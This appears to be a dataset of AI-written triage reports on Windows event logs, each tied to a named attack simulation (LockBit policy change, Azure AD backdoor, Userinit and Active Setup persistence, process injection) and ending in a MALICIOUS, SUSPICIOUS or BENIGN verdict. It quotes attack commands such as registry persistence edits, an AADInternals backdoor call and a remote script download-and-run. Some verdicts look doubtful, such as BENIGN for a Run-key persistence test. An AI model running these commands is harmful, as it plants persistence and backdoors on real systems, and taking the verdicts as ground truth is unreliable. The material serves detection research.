LockBit Black - Modify Group policy settings -Powershell,"Upon reviewing the provided logs, here's an analysis detailing any suspicious or anomalous activity observed:

1. **PowerShell Activity:**
   - There is evidence of PowerShell being used to modify the registry keys related to system policies:
     ```
     CommandLine: ""powershell.exe"" & {New-ItemProperty \""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\\"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force,...
     ```
   - This activity can be suspicious because PowerShell is a powerful shell and language for system administration, and manipulation of registry keys without clear documentation or purpose might indicate malicious intent, especially when modifying Group Policy settings directly.

2. **Wevtutil Activity:**
   - Multiple executions of `wevtutil.exe`, which is a command-line utility used to retrieve information about event logs, export logs, and perform other event log management functions:
     ```
     C:\\Windows\\System32\\wevtutil.exe
     ```
   - It was executed by the `admin_test` user account multiple times. Frequent use of `wevtutil` may indicate someone is clearing or manipulating logs which can be a tactic used to cover tracks post-breach.

3. **High Integrity Level Processes:**
   - Various processes such as `whoami.exe`, `hostname.exe`, and `PowerShell.exe` executed with high integrity levels:
     ```
     IntegrityLevel: High
     ```
   - While in some contexts this is normal, the timing and combination with other activities might be suspicious.

4. **Security Logs and Time Change:**
   - The time appears to have been changed with entries from the `Kernel-General` log indicating a change in system time:
     ```
     EventID: 1, NewTime: ""2024-10-26 19:05:07.9061442"", OldTime: ""2024-10-26 19:05:07.9062131""
     ```
   - Unexpected or unauthorized time changes can be a red flag as attackers may change system times to bypass or confuse certain time-based security mechanisms or logs.

**Assessment:**
- The activity observed regarding PowerShell and registry changes, repeated `wevtutil` use, and the combination of high-integrity level processes does not conclusively confirm malicious activity but suggests potentially unauthorized actions which could be part of a privilege escalation or persistence mechanism. The time change is an additional indicator that something may be awry.

**Resolution: SUSPICIOUS**
- These logs indicate activity that doesn't immediately confirm malicious intent but definitely warrants further investigation. The use of PowerShell and registry changes, especially in the absence of prior context or explanation for these actions, should raise suspicion.
  
**Guidance on How to Proceed:**
1. **Investigate User Activity:**
   - Confirm the legitimacy of `admin_test` activity; check whether this user had legitimate reasons to run the commands and processes observed.
2. **PowerShell Logging:**
   - Enable and review detailed PowerShell script block logging to capture and further analyze any unusual PowerShell usage.
3. **Review Policy Changes:**
   - Investigate the specific registry changes for policy manipulation to ensure no unauthorized policies are being enforced.
4. **Monitor & Alert:**
   - Set up monitoring for future similar activities, especially the execution of PowerShell scripts and the use of `wevtutil.exe`.
5. **Time Sync Check:**
   - Verify the time synchronization setup for the system and review any additional logs related to time adjustments.

By taking the above actions, you'll be able to determine if the activity is part of a larger malicious campaign or if there's an acceptable explanation behind these entries."
Azure AD Application Hijacking - App Registration,"Upon reviewing the provided logs, there are several indications of potentially malicious activity, particularly surrounding the execution of Windows PowerShell scripts in conjunction with AzureAD interactions:

1. **Suspicious PowerShell Script Execution:**
   - The logs reveal the execution of a PowerShell script that manipulates the AzureAD environment, including actions like importing the AzureAD module, converting passwords to secure strings, connecting to AzureAD, creating self-signed certificates, and attempting application hijacking.
   - The logged PowerShell command suggests credential stuffing and possible certificate-based backdoor attacks: `""powershell.exe"" & {Import-Module -Name AzureAD...}`. Attempts to create a certificate and manage Azure applications indicate a potentially malicious attempt to access Azure resources under a compromised or unauthorized account.
   - Specifically, the script involves creating a self-signed certificate set to expire after one day, potentially as a precautionary measure to avoid leaving long-term access traces.

2. **High Integrity Level and Secure Execution Context:**
   - The integrity level of the PowerShell process (`High`) and execution under a user context (`SERVER002\\admin_test`) suggest that the script ran with elevated privileges, which is often necessary for such administrative actions in a Windows environment.
   - The associated Sysmon logs confirm processes executed as the ""SERVER002\\admin_test"" user, who may have unintended access or privileges.

3. **Automation and Obfuscation:**
   - The script's complexity and automation (e.g., use of `$cert = New-SelfSignedCertificate...`) may indicate attempts to bypass manual detection. This level of scripting behavior could signify Advanced Persistent Threat (APT) actions or other sophisticated attack methods.

4. **Credential Harvesting or Spoofing:**
   - The use of `System.Management.Automation.PSCredential` objects to store credentials indicates credential manipulation which, if unauthorized, could result in a serious network or data breach.
   - The described actions aim at ""Application Hijacking,"" a tactic to impersonate or covertly control AzureAD applications, enabling broad access to cloud resources.

5. **Minimal 'Benign' Activity Context:**
   - While the System, Security, and Application logs show updates and standard process executions, the suspected malicious behavior outlined above significantly overshadows this benign activity, demanding immediate investigative response.

### Conclusion

Given the noted instances of potential malicious activity, particularly tailored PowerShell execution with possible backdoor setup and AzureAD manipulation, the resolution for this analysis is:

**Resolution: MALICIOUS**

### Recommendations and Next Steps

1. **Immediate Isolation and Investigation:**
   - Isolate the affected server (Server002) from the network to prevent further unauthorized access or data exfiltration.

2. **Credentials Review and Rotation:**
   - Conduct a comprehensive review and rotation of credentials, particularly those pertaining to AzureAD accounts.

3. **Enhanced Monitoring and Audit Configuration:**
   - Establish or enhance logging and monitoring specifically for PowerShell activities and AzureAD interactions, focusing on detecting unauthorized commands or anomalies.

4. **Incident Analysis and Threat Intelligence:**
   - Investigate the logs further to identify any indicators of compromise (IoCs) related to exfiltration or lateral movement within the network. Utilize threat intelligence services to understand potential related campaigns or attackers.

5. **Remediation and System Hardening:**
   - Apply policies that limit script execution and require administrative approval for executing sensitive commands. Ensure security patches are up to date.

A thorough review and response could significantly mitigate this threat and enhance organizational security posture."
Add Federation to Azure AD,"Upon analysis of the provided Windows event logs, the following key observations are noted:

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - The logs show multiple instances where `wevtutil.exe` (Windows Event Utility) and `conhost.exe` (Console Window Host) are executed. `wevtutil.exe` can be used to manage event logs and it appears frequently alongside `conhost.exe`. Although these tools are part of normal Windows operations, their repetitive execution could be suspicious if it was not expected in this scenario and could be indicative of manual log clearing attempts or other trickery often associated with adversarial tactics.

2. **Execution of PowerShell with AzureAD and AADInternals Modules:**
   - A particular PowerShell command sequence is notable:
     ```powershell
     Import-Module AzureAD
     Import-Module AADInternals
     ...
     ConvertTo-AADIntBackdoor
     ```
   - The script attempts to manipulate Azure Active Directory (AAD) configurations and tokens, potentially adding a federation setup backdoor. This behavior is highly suspicious and aligns with known malicious activities aimed at compromising Azure identities and environments.

3. **Execution Context:**
   - All processes and commands are initiated under the user account `SERVER002\admin_test`. The integrity level is high, indicating administrative privileges. The script seems to operate from a temporary directory, which in combination with the attempted AAD manipulation, is consistent with malicious activity often seen in attacks targeting Azure environments.

4. **Command Arguments and Usage Patterns:**
   - The PowerShell script demonstrated involves using hardcoded credentials (`iamthebatman`) and attempts to connect to AzureAD and perform potentially unauthorized actions. The use of commands like `ConvertTo-AADIntBackdoor` suggests malicious intent as it tries to create a backdoor within Azure AD.

**Assessment:**
The presence of script execution involving sensitive AzureAD operations and the backdoor creation attempt using PowerShell indicates a strong possibility of malicious activity. The frequent invocation of `wevtutil.exe` could be an attempt to modify or query event logs programmatically, which may indicate an effort to cover tracks or maintain persistence.

**Resolution: MALICIOUS**

**Guidance:**
- **Immediate Action Required:** Disconnect the affected system (Server002) from the network to prevent further unauthorized access.
- **Thorough Investigation:** Conduct a deep forensic analysis on the affected server to uncover additional indicators of compromise.
- **Credential Audit:** Reset credentials for `admin_test` and any potentially affected accounts. Verify the security of Azure AD and associated services.
- **Security Patch:** Ensure the system is fully patched and up-to-date with all security updates.
- **Review Logs:** Examine logs (if available) from security appliances that might provide external context (SIEM logs, firewall logs, etc.).
- **Educate and Train Staff:** Raise awareness of such tactics among IT staff to enhance the detection and prevention of similar activities in the future."
Shellcode execution via VBA,"After analyzing the provided Windows event logs, particularly focusing on the Sysmon and Windows PowerShell logs, the following observations have been made:

1. **PowerShell Execution:**
   - Multiple Sysmon log entries indicate the use of `powershell.exe` with a specific command-line that includes downloading and executing a script from an external URL: `https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/script.ps1`. 
   - This behavior is suspicious as it involves downloading a script from a non-whitelisted domain and executing it, which is a common technique used by attackers to download and run malicious payloads.

2. **Process Execution and Correlation:**
   - Instances of `wevtutil.exe` and `conhost.exe` are repeatedly documented in the logs. While `wevtutil.exe` is used for managing event logs, its frequent execution in a short period is somewhat unusual and could indicate log tampering or query attempts.
   - `conhost.exe` is a legitimate process but its recurring presence alongside `wevtutil.exe` and PowerShell raises questions about potential command-line operations performed in the background.

3. **Integrity Level and User Context:**
   - The processes are executed with high integrity levels under the `SERVER002\admin_test` account. The high integrity level indicates elevated privileges, which can be indicative of privilege escalation attempts, though it's less obvious in this data.

4. **Command-Line Review:**
   - The executed script via PowerShell (`Invoke-script -macroFile` and subsequent parameters) suggests an automated task, which aligns with unauthorized macro executions often found in fileless attacks.
   - The execution context indicates automation and obfuscation, likely used to evade traditional defenses.

Based on these observations, the conducted activities hold characteristics typical of malicious operations:

- The unauthorized downloading and execution of scripts from an external source.
- The suspicious timing and frequency of specific tool execution.
- The high integrity level operations under potentially misused admin credentials.

**Final Assessment: MALICIOUS**

The detected activities in the logs exhibit clear indicators of compromise, specifically through suspicious PowerShell operations that align with known malicious patterns. This finding should prompt immediate measures to isolate and investigate the affected host for further remediation steps.

**Recommended Actions:**

1. Isolate `Server002` from the network to prevent further potential harm.
2. Conduct a detailed forensic analysis, particularly focusing on scripts downloaded and PowerShell execution logs.
3. Reset credentials for any administrative accounts used on the server.
4. Review and update firewall and endpoint security rules to block similar occurrences in the future.
5. Consider using real-time monitoring solutions to detect and alert on similar patterns promptly."
Process Injection via C#,"Upon analyzing the provided Windows event logs from the Sysmon, System, Security, Application, and PowerShell logs of Server002, several events and behaviors stand out that warrant further investigation:

### Detailed Analysis:

1. **Use of Powershell**:
   - Powershell is often used in both legitimate and malicious activities. It is crucial to assess how it is being used. Here, Powershell execution by `SERVER002\admin_test` is noted, which by itself is not suspicious but could be part of a larger pattern or script execution. There is no direct evidence of malicious command-line arguments or scripts associated with these entries.

2. **Frequent Use of Command-Line Tools**:
   - There are multiple entries showing `conhost.exe`, `wevtutil.exe`, and `cmd.exe` being executed. `cmd.exe` is seen executing a command from `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\bin\data.exe` through `cmd.exe /c`. This directory path is often suspicious because executable files within the Temp directory are frequently used by malicious software due to their temporary nature and minimal monitoring.

3. **Events with High Integrity Level**:
   - The entries indicate that processes like `cmd.exe` and `hostname.exe` were run with High integrity level by user `SERVER002\admin_test`. Running with high integrity could indicate privilege escalation or execution of critical commands/scripts, which can be suspicious depending on the context.

4. **Anomalies in Time Synchronization**:
   - There are entries suggesting time changes on the System (`EventID 4616` in the Security log and `EventID 1` in the System log). Unusual time changes can be indicative of attempts to manipulate time-dependent security controls or cover tracks. Though these actions might also be related to legitimate system updates or network time corrections, they deserve attention in conjunction with other suspicious activities.

5. **Execution of Unusual Applications**:
   - Execution of `wsmprovhost.exe` in a server environment should be monitored, especially if it correlates with unexpected sessions or users.

6. **Temp Directory Executable**:
   - The most telling potential indicator is the execution of the executable from within the Temp directory. This is often associated with downloader or dropper trojans, especially given the obscured path (`ADMIN_~1`).

### Assessment:
Given the context, one event stands out as needing further exploration: the execution of a binary from a temporary directory via `cmd.exe`. This behavior, compounded with other script executions, and time changes, seems out of place on a server and could indicate potential malicious activity aimed at evading detection or preparing the system for subsequent steps of an attack.

### Resolution: **SUSPICIOUS**

This collection of events indicates activity that is not immediately malicious but suspicious enough to warrant a thorough investigation. If legitimate activity cannot be confirmed by administrators or recent configuration changes do not account for these actions, it is prudent to proceed with caution. Steps should include:

- Isolating the host to prevent potential spread of any infection.
- Conducting a memory and disk forensic analysis.
- Reviewing recent user activities and access logs.
- Engaging endpoint protection and threat intelligence resources for further analysis of the executable found in the temp directory.

By taking these precautionary measures, you can ensure that any potential threat is managed and neutralized effectively."
Azure AD - adding permission to application,"Upon reviewing the provided Windows event logs, here's a detailed breakdown of the findings:

### Suspicious or Anomalous Behavior:

1. **PowerShell Usage**:
   - The logs show a Windows PowerShell (`powershell.exe`) process with a rather complex command line that involves operations related to Azure Active Directory applications and service principals. Specifically:
     - Importing the `AzureAD` module.
     - Setting sensitive configurations and resources in AzureAD.
   - The script contains sensitive operations like creating an AzureAD application, a service principal, assigning app permissions, and connecting using specific credentials. This functionality could indicate a misconfiguration or unauthorized access attempt if not sanctioned.

2. **Usage of ConvertTo-SecureString**:
   - The command uses `ConvertTo-SecureString` with `-AsPlainText`, which is not typical best practice for handling credentials within scripts. This might be an attempt to avoid secure storage mechanisms, raising the suspicion of credential mishandlement.

3. **Frequent Execution of Windows Console Applications**:
   - Multiple instances of `conhost.exe` and host-related applications like `HOSTNAME.EXE` and `whoami.exe` are executed in quick succession. While these executions themselves are not inherently malicious, their rapid, sequential appearance raises questions typically associated with scripted or automated tasks.

4. **Use of Wevtutil**:
   - Instances of `wevtutil.exe` are observed. This tool is typically used to read or write events and edit logs, and could be leveraged by attackers to clear tracks.

### Assessment of the Situation:

The logs collectively present activities around PowerShell that are somewhat atypical for routine administrative tasks, especially concerning AzureAD manipulation. The usage of scripts to manage cloud service permissions and the use of plaintext passwords are potential indicators of compromise or a mishandled automation task. Additionally, frequent processes typically associated with command line and administrative tasks might suggest the environment is either under scripted automation or an exploit attempt.

### Identified Threats or Risks:

1. Potential unauthorized manipulation of Azure resources due to the complexity of the PowerShell commands involved.
2. Possible security governance concerns regarding the handling of credential data.
3. Automation scripts might be running that could introduce security vulnerabilities if not properly managed or secured.

### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Verify whether the PowerShell commands were part of scheduled administrative tasks or automation scripts authorized by IT operations. Check who executed these, validate their intent, and ensure it aligns with operational expectations.
   - Closely review user `SERVER002\admin_test` for unusual access patterns or permissions that might be inconsistent with typical roles.

2. **Long-term Actions**:
   - Implement stricter monitoring on PowerShell usage and configure script block logging to capture full command lines of executed scripts.
   - Evaluate the implementation of secure credential storage and access methods to avoid plaintext password usage.
   - Regularly audit permissions within the Azure environment to ensure they align with the principle of least privilege.

### Final Resolution:

- **SUSPICIOUS**: The activities recorded require further investigation to ensure they are legitimate administrative operations. Possible risks were identified that warrant review and validation through proper change management or operational records."
Process Injection with Go using EtwpCreateEtwThread WinAPI,"Upon analyzing the provided logs, I have identified several events that warrant further scrutiny, primarily from the Windows PowerShell and Sysmon logs:

1. **PowerShell Activity**:
   - The PowerShell logs indicate a suspicious execution of a binary located at `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\x64\EtwpCreateEtwThread.exe` with the `-debug` flag. The usage of executables from a temporary directory is atypical in standard operations and may signify an attempt to execute malicious code or perform operations that require heavy debugging. This path and behavior could suggest a tactic used by attackers to circumvent security controls.

2. **Sysmon Logs**:
   - The Sysmon logs correlate with the PowerShell activity showing the creation of processes such as `conhost.exe` and `wevtutil.exe` by the user `SERVER002\admin_test`, but without a clear legitimate or standard purpose. Notably, the Sysmon events include two instances of `whoami.exe` and `HOSTNAME.EXE`, which in themselves are benign but, combined with the PowerShell activity, can be suspicious as these are often used for reconnaissance.

3. **Privilege Information**:
   - It's also noted the user account `admin_test` has been assigned a variety of powerful privileges (e.g., `SeDebugPrivilege`) that allow modifications or potential subversion of system security. This could be indicative of privilege escalation.

**Assessment and Recommendations**:
- **Assessment**: Given the combination of unusual binary execution from a temporary directory, commands issued with potential administrative intent or privileges, and the execution traces captured by Sysmon, the scenario seems suspicious. The PowerShell execution stands out as potentially malicious.
- **Resolution**: **SUSPICIOUS** - While there is no direct sign of a confirmed malicious activity, the indicators align with tactics often seen in targeted attacks aiming to perform reconnaissance or privilege escalation. This requires a more in-depth investigation to confirm if malicious actions were indeed performed.
  
**Guidance**:
1. **Immediate Actions**:
   - Isolate the host `Server002` from the network to prevent potential lateral movement or data exfiltration.
   - Conduct a thorough manual inspection of `Admin_test` user activity to verify if the elevated privileges assigned were appropriate and legitimate.
   
2. **Further Investigation**:
   - Retrieve and analyze the suspicious binary `EtwpCreateEtwThread.exe` for malware characteristics or anomalous operations.
   - Review any changes or anomalies in file systems and registry keys that can suggest persistence methods.
   - Cross-reference network logs to see if there was any outbound communication following this PowerShell execution, possibly indicative of data exfiltration.

3. **Long-term Measures**:
   - Implement stricter controls around the execution of scripts and binaries, especially from temporary directories, potentially using application whitelisting.
   - Improve auditing and monitoring setup to catch similar anomalies early.

Due to the risks involved, consider engaging with incident response professionals for deeper-rooted analysis and containment."
Domain Password Policy Check: No Uppercase Character in Password,"## Detailed Analysis of Windows Event Logs

### PowerShell Logs Analysis:
- **Behavior Observed:** The PowerShell events are repeatedly attempting to change a user's Active Directory (AD) account password using a script. This script verifies if the new password matches the one stored in a local file and aborts if true. If the stored password is incorrect, it removes the credential file. If successful, it writes the new secured password back to a file.
- **Suspicious Elements:**
  - The presence of a hardcoded password, ""lower-long-special-333"", suggests insecure scripting practices, as it could be easily retrieved by an attacker.
  - The script attempts to manage AD credentials, a sensitive operation, frequently a target in intrusion tactics.
  
### Security Logs Analysis:
- **Behavior Observed:** Event ID 4798 indicates attempts to enumerate local users' information multiple times in a short span, using CompatTelRunner.exe, which is generally used for telemetry purposes and does not typically enumerate users.
- **Suspicious Elements:**
  - Repeated enumeration of user details is notably executed by ""CompatTelRunner.exe"", executed under SYSTEM privileges, further raising suspicion of its use in gaining information on active accounts for further exploitation.
  - The same process, CompatTelRunner.exe, interacts with known user accounts and attempts to retrieve group membership details, a typical reconnaissance behavior.

### Sysmon Logs Analysis:
- **Behavior Observed:** Multiple Sysmon Event ID 1 and 5 capture the execution of PowerShell and other potentially benign processes like conhost.exe, wevtutil.exe, and whoami.exe by user ""SERVER002\\admin_test"".
- **Suspicious Elements:**
  - The use of PowerShell scripts, especially without clear legitimate necessity, can be deemed as a red flag, particularly combined with potential sensitive actions like password changes.
  - Usage of wevtutil.exe, which administers event logs, could imply log clearing attempts, synonymous with anti-forensic activity.

### Assessment:
There are indicators suggesting potentially malicious activities or at least behavior inconsistent with normal operations:
1. Insecure PowerShell script handling AD passwords.
2. Enumeration of user accounts and actions often associated with initial access or lateral movement phases by an adversary.
3. The script from the PowerShell logs is possibly being used by 'admin_test', hinting at a user account possibly compromised or misconfigured.

### Conclusion:
The analysis of the events describes activities that exhibit characteristics of ""Living off the Land"" tactics, leveraging built-in system utilities for attacks while minimizing detection. While individual activities may not conclusively indicate compromise, the aggregation and context suggest suspicious behavior patterns of a user account potentially being manipulated or misused without clear authorized intent.

### Resolution: **SUSPICIOUS**
The activities discerned from the log events, particularly concerning password management and user enumeration using system telemetry processes, require further investigation to ascertain intent, potential compromise level, and whether additional artifacts, indicators, or corroborative evidence exist for malicious intent.

### Recommended Actions:
- Conduct a thorough inspection of ""admin_test"" user activity and authentication logs for abnormal behavior or unauthorized access.
- Review the configuration and usage of ""CompatTelRunner.exe"" and related processes for signs of misuse.
- Investigate the workstation and network traffic associated with ""Server002"", focusing on identifying any command and control activities.
- Enhance logging and alert rules to capture indicative actions that resemble misuse of PowerShell or overly broad AD credential handling scripts."
secedit used to create a Run key in the HKLM Hive,"### Analysis of the Logs

1. **Application Log**:
   - The entries mainly pertain to software protection and edge updates. The software protection platform appears to be functioning normally, and there are no unusual entries or error codes.

2. **System Log**:
   - There are entries related to Group Policy processing and some kernel time updates, which are usual system functions. The time changes captured do not show any discrepancies that indicate tampering.

3. **Security Log**:
   - The notable event is the time change captured (Event ID 4616). The participant `svchost.exe` with `LOCAL SERVICE` indicates a routine time synchronization event, typical of a Windows environment. No anomalies indicating privilege escalation or unauthorized time changes are evident.

4. **Sysmon Log**:
   - The logs show a series of processes, largely from Microsoft EdgeUpdate activities, involving multiple instances and operations such as update, registration, and setting configurations. This represents a typical software update procedure.
   - Some entries indicate command-line executions like `cmd.exe` and `secedit`, which are commonly used for system configurations or updates. These seem linked with user `SERVER002\admin_test`, potentially indicating an administrative action rather than unauthorized access.
   - No processes stand out as explicitly malicious such as odd process names, file paths, or unknown executables. The hash values are consistent with legitimate Microsoft software, suggesting files are untampered.
   - It is worth noting the presence of administrative scripts or tasks, but they align with possible maintenance or intended system configurations.

### Assessment and Conclusion

The logs primarily reflect routine system operations and update processes, particularly from Microsoft Edge, without displaying obvious signs of compromise or malicious activity. The entries are largely associated with legitimate Windows services and processes without anomalous command-line arguments or indicators of abuse.

### Resolution

**BENIGN** - The logs appear to contain benign activity consistent with system updates and administrative tasks with no clear indicators of malicious activity. However, if there are specific concerns or recent security advisories related to Microsoft Edge updates, cross-referencing with threat intelligence or vendor alerts is advised as a precautionary measure."
HKLM - Add malicious StubPath value to existing Active Setup Entry,"Upon reviewing the provided Windows event logs, the following points of interest and potential anomalies were identified:

1. **Microsoft Edge Updates**: A significant portion of the logs involves process executions tied to Microsoft Edge Update tasks, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`. These executions appear to be routine and consistent with system maintenance activities. No indications of malicious behavior or unexpected command-line arguments were noted in these processes.

2. **PowerShell Activity**: 
   - There is an isolated execution of a PowerShell command that modifies the Windows registry using the command: `Set-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}"" ""StubPath"" ""C:\Windows\System32\calc.exe"" -Force`. This action was followed by launching `calc.exe` using `runonce.exe`.
   - While the execution of `calc.exe` in itself is benign, using PowerShell to modify the registry stub path for execution persistence can be a technique used in malware or unauthorized modifications. This warrants further investigation.

3. **Whoami and Hostname Executions**:
   - Processes such as `whoami.exe` and `hostname.exe` were executed from a directory associated with a user account (`admin_test`). These commands are often used in scripting and administrative task contexts but can also be used by unauthorized personnel for reconnaissance. 
   - The processes were executed under a high integrity level, suggesting they had elevated privileges, which is not inherently suspicious but should be monitored, especially in the context of other suspicious activities.

4. **Wevtutil Execution**: 
   - The `wevtutil.exe` process was executed several times. This utility is used for querying and managing event logs and channels, which can be legitimate but also abused by attackers to clear logs.

5. **Time Changes**:
   - There were events associated with time adjustments performed by `svchost.exe`, which could be routine NTP synchronization. However, time changes can also be used to obscure logs, and this context should be verified to ensure it aligns with expected behavior.

6. **General Observations**:
   - The behavior seen across the logs predominantly centers around update processes and system maintenance operations. The primary anomaly involves the registry modification and automated launching of `calc.exe`, which deserves further inquiry.

**Assessment and Resolution**:
- **Resolution**: SUSPICIOUS
- **Guidance**: It is advised to further investigate the PowerShell script execution that modified the registry and launched `calc.exe`. This could indicate a potential persistence mechanism, albeit using a benign application. Ensure this was an authorized script or part of legitimate software behavior. Additionally, scrutinize the source and context of the wevtutil executions and confirm if the observed time changes were expected NTP operations or something unauthorized."
Process Injection with Go using CreateThread WinAPI (Natively),"**Analysis of Log Entries:**

1. **Security Logs:** 
   - The events with EventID 4616 correspond to changes in system time, where the system time was adjusted backwards. Legitimate reasons for such an event might include time synchronization processes, yet time adjustments can also indicate attempts to confuse forensic analysis or circumvent time-based security mechanisms.

2. **Sysmon Logs:**
   - The Sysmon events show multiple process creations, including instances of `wevtutil.exe` and `conhost.exe` linked to the user `SERVER002\admin_test`. These are typically legitimate processes used by the system.
   - However, the `powershell.exe` process with a suspicious command-line argument invoking `CreateThreadNative.exe` from a temporary directory stands out. The use of `CreateThreadNative.exe` with a `-debug` flag suggests debugging activity or potential evasion techniques. Such instances are often related to malware or advanced persistent threat activities.
   - The presence of processes doing things like `whoami.exe` and `hostname.exe` can be legitimate but often accompany malicious recon activities.

3. **Windows PowerShell Logs:**
   - The PowerShell logs show the initiation of a session with the application `powershell.exe & {C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\bin\\x64\\CreateThreadNative.exe -debug}`. This indicates potential malicious PowerShell activity. Execution from a temporary directory and especially invoking an executable like `CreateThreadNative.exe` is highly suspicious.

4. **System Logs:**
   - Time adjustments were logged in the system logs as well. Such changes can indicate an attempt to disrupt logging or forensic analysis.

5. **Application Logs:**
   - The Software Protection Platform Service log (SPP) appears normal, indicating a routine update check or operation.

**Assessment:**
The combination of time alterations, suspicious PowerShell activity involving `CreateThreadNative.exe`, and the command-line argument from a temporary file strongly suggests a compromised host. The activities are consistent with malicious behavior such as evasion techniques and deploying malware through scripting.

**Resolution: MALICIOUS:**
Given the suspicious activities observed:
- **PowerShell activity invoking suspicious executables from a temporary directory.**
- **System time adjustments, potentially to obfuscate malicious activity.**

**Guidance:**
1. **Immediate Action:**
   - Isolate the affected host (Server002) from the network to prevent further spread.
   - Preserve the logs and volatile data for further forensic analysis.

2. **Further Investigation:**
   - Perform a full malware scan of the affected host with updated antivirus software.
   - Investigate the source and contents of `CreateThreadNative.exe` for further evidence of compromise or malicious payloads.

3. **Response Plan:**
   - If malware is confirmed, follow incident response protocols, including analyzing other host behaviors across the network.
   - Fortify security measures such as endpoint detection and response (EDR) solutions to detect similar threats in the future.

4. **Review and Harden:**
   - Conduct a thorough review of access rights and permissions, especially for the `admin_test` account.
   - Enhance monitoring for anomalous PowerShell usage and file executions from temporary directories."
Add Executable Shortcut Link to User Startup Folder,"Based on the provided log entries, we can identify several points of interest:

1. **PowerShell Activity:**
   - The Windows PowerShell logs show a significant activity: the creation of a shortcut in the startup directory for `calc.exe` using PowerShell. This type of behavior is typically associated with persistence mechanisms to ensure a payload (in this case, `calc.exe`) runs whenever the user logs into the system. This behavior can be suspicious as malicious scripts often use techniques like this to persist across reboots.

2. **Sysmon Activity:**
   - There is a Sysmon log entry that shows a PowerShell command being executed to create a shortcut for `calc.exe` in the startup directory, corroborating the PowerShell log findings.
   - There are also numerous Sysmon logs detailing processes related to `MicrosoftEdgeUpdate.exe` and other legitimate Microsoft processes such as `wevtutil.exe`. These entries are consistent with regular software update activities and Windows management operations.

3. **Application and System Logs:**
   - Logs from `edgeupdate` and other system services suggest updates and regular service operations.
   - Windows Defender is reported to be active and functioning, according to its state in the logs.

### Assessment:
The presence of a script running to place `calc.exe` in the startup directory is a classic sign of unwanted persistence that could be associated with more serious malicious activities. Although `calc.exe` itself is not malicious, its use here for persistence without clear justification can be considered suspicious, especially if it was implemented ambiguously or unexpectedly.

### Resolution:
- **SUSPICIOUS** - The activity involving PowerShell script leading to persistence is not standard for most legitimate user activities and requires further investigation to confirm the intent behind this action. There is no clear evidence of direct harm or exploitation based solely on these parameters, but this action is enough to warrant concerns and subsequent verification.

### Guidance:
1. **Immediate Action:**
   - Verify whether any legitimate automation or script may have performed the PowerShell action (such as a user script, a software deployment tool, or an administrative task).
   - If no legitimate purpose is identified, remove the shortcut to `calc.exe` and check for any unauthorized changes or further unauthorized scripts.

2. **Further Investigation:**
   - Conduct a security sweep or forensic analysis of the system to ensure no other malicious activity is ongoing.
   - Review user activity logs to determine associated actions leading up to this event.
   - Ensure that all security patches and updates are applied on the system to prevent exploitation of known vulnerabilities.
   - Assess system and network for other potential indicators of compromise related to persistence or privilege escalation mechanisms.

By considering these steps, the anomaly can be sufficiently assessed and any associated risks mitigated."
Winlogon HKLM Userinit Key Persistence - PowerShell,"Based on the examination of the provided logs, here is the detailed analysis:

1. **Application Log:**
   - The logs primarily document routine operations, such as the stopping of the Edge Update service (`edgeupdate`). Nothing suspicious is evident in this segment in isolation.

2. **System Log:**
   - There are standard time adjustments by the system and the regular Windows Time Service interaction. While time adjustments can be suspicious if done by unauthorized users, these appear legitimate and system-related.

3. **Sysmon Log:**
   - The logs document numerous process activities. Notably, there is an execution of PowerShell with a command altering the `Userinit` registry key:
     - Command: `powershell.exe & {Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, C:\Windows\System32\cmd.exe"" -Force}`
     - Modifying `Userinit` is often a technique used by attackers to achieve persistence, whereby `cmd.exe` is also set to run on user login, which is suspicious behavior.

4. **Security Log:**
   - Normal system and user logon/logoff activities are recorded.
   - There is a logon event that grants high privileges (`e.g., SeDebugPrivilege, SeBackupPrivilege`). Checking the source and reason for this account's actions might be warranted if it seems inconsistent with standard operations.

5. **Windows PowerShell Log:**
   - The logs confirm the execution of a potentially malicious PowerShell command, mirroring that shown in the Sysmon logs. This script modifies the `Userinit` registry key. This registry key modification can allow an attacker to maintain access or execute additional commands via a command prompt on user logon.

### Assessment:
- The modification of the `Userinit` registry key using PowerShell is a well-known persistence method, signifying potential unauthorized system modification.
- The PowerShell command and related Sysmon logs suggest system compromise activities.

### Recommendations:
- **Inspect the modifications** related to the `Userinit` registry key change. Auditing other systems in the network for similar behavior could be beneficial.
- **Investigate the source** related to this PowerShell activity, especially regarding user behavior (`admin_test` account) during this time frame, as this account appears linked to the suspicious activity.
- **Conduct further forensic analysis** on memory and network activity around the timestamp of this modification to determine if other unauthorized access or data exfiltration occurred.
- **Immediately review user account actions** and adjust credential policies as necessary to prevent unauthorized privilege escalation.

Given the above context and suspicious activities identified, I would classify the overall situation as **MALICIOUS**—because the evidence strongly indicates unauthorized and potentially harmful activity influenced by, or targeting, a persistence mechanism."
Process Injection via Extra Window Memory (EWM) x64 executable,"### Detailed Analysis:

#### 1. Application Log
The events from the Microsoft-Windows-Security-SPP event provider suggest regular activity related to the Software Protection Platform Service. These events occur regularly and do not demonstrate any aberrant behavior typically associated with malicious activity.

#### 2. Security Log
- **Event 4624** and **Event 4672**: These indicate successful logons and privilege assignments associated with the SYSTEM account. While these are typical for system processes, they do indicate elevated privileges being granted. Multiple events log elevated privileges such as SeDebugPrivilege, which can be exploited maliciously.
  
- **Event 5379**: These logs show attempts to read credentials for a Microsoft Account or Windows Live. The events have a consistent return code indicating failure. Repeats of such events without a successful log could be an unauthorized attempt to access credential material.

#### 3. Sysmon Log
- **Unusual Process Execution**: The execution of `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.011\bin\data.011_x64.exe` via PowerShell appears suspicious. This is typically indicative of a file located in a temporary directory often used in attacks to execute non-native programs. The absence of FileVersion or Company information further adds to the suspicion.

